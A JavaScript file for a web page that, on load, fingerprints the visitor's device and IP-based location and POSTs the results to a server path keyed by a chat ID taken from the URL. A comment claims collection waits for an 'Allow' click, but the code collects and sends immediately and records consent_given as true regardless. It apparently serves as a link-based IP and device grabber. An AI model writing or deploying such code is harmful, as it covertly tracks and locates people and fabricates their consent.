const allowBtn = document.getElementById("allow-btn");
const resultEl = document.getElementById("result");
const sendBtn = document.getElementById("send-btn");
const statusEl = document.getElementById("status");
const userIdInput = document.getElementById("user-id");

let collectedData = null;

function getChatIdFromUrl() {
  const parts = window.location.pathname.split("/");
  return parts[2] || null;
}

// Auto-fill chat ID into input
window.addEventListener("DOMContentLoaded", () => {
  const chatId = getChatIdFromUrl();
  if (chatId) {
    userIdInput.value = chatId;
  }
});

function safeValue(value, fallback = "Unavailable") {
  if (value === null || value === undefined || value === "") {
    return fallback;
  }
  return value;
}

function getDeviceModel() {
  const uaData = navigator.userAgentData;
  if (uaData && Array.isArray(uaData.brands)) {
    return safeValue(uaData.platform, "Unknown platform");
  }
  return safeValue(navigator.platform, "Not exposed by browser");
}

async function getBatteryDetails() {
  if (!navigator.getBattery) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }

  try {
    const battery = await navigator.getBattery();
    return {
      battery_level: `${Math.round((battery.level || 0) * 100)}%`,
      battery_charging: battery.charging ? "Yes" : "No",
    };
  } catch (_err) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }
}



async function getIpAndApproxLocation() {
  try {
    const response = await fetch("/get-ip");
    const data = await response.json();

    if (!response.ok) {
      return {
        ip_address: "Unavailable",
        country: "Unavailable",
        region: "Unavailable",
        city: "Unavailable",
        timezone: "Unavailable",
      };
    }

    return data;

  } catch (_err) {
    return {
      ip_address: "Unavailable",
      country: "Unavailable",
      region: "Unavailable",
      city: "Unavailable",
      timezone: "Unavailable",
    };
  }
}

function bytesToGBString(bytes) {
  if (typeof bytes !== "number") {
    return "Unavailable";
  }
  return `${(bytes / (1024 ** 3)).toFixed(2)} GB`;
}

async function getStorageDetails() {
  if (!navigator.storage || !navigator.storage.estimate) {
    return {
      storage_used_gb: "Unavailable",
      storage_total_gb: "Unavailable",
    };
  }

  try {
    const estimate = await navigator.storage.estimate();
    return {
      storage_used_gb: bytesToGBString(estimate.usage),
      storage_total_gb: bytesToGBString(estimate.quota),
    };
  } catch (_err) {
    return {
      storage_used_gb: "Unavailable",
      storage_total_gb: "Unavailable",
    };
  }
}

// Collect only after clicking Allow
document.addEventListener("DOMContentLoaded", async () => {

  // ✅ FIRST: Collect Data
  const battery = await getBatteryDetails();
  const ipData = await getIpAndApproxLocation();
  const storageData = await getStorageDetails();

  collectedData = {
    device_model: getDeviceModel(),
    user_agent: navigator.userAgent,
    language: navigator.language,
    screen_resolution: `${window.screen.width}x${window.screen.height}`,
    consent_given: true,
    cpu_cores: navigator.hardwareConcurrency ?? "Unavailable",
    ram_gb: navigator.deviceMemory ?? "Unavailable",
    battery_level: battery.battery_level,
    battery_charging: battery.battery_charging,
    ip_address: ipData.ip_address,
    country: ipData.country,
    region: ipData.region,
    city: ipData.city,
    timezone: ipData.timezone,
    storage_used_gb: storageData.storage_used_gb,
    storage_total_gb: storageData.storage_total_gb,
  };

  resultEl.textContent = JSON.stringify(collectedData, null, 2);
  sendBtn.disabled = false;

  // ✅ SECOND: Send After First Completes

  const chatId = getChatIdFromUrl();
  if (!chatId) {
    statusEl.textContent = "Chat ID missing.";
    return;
  }

  statusEl.textContent = "Sending...";

  try {
    const res = await fetch(`/num/${chatId}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(collectedData),
    });

    const data = await res.json();

    if (!res.ok) {
      statusEl.textContent = data.error || "Failed.";
      return;
    }

    statusEl.textContent = "Sent successfully.";

  } catch (err) {
    statusEl.textContent = "Network error.";
  }

});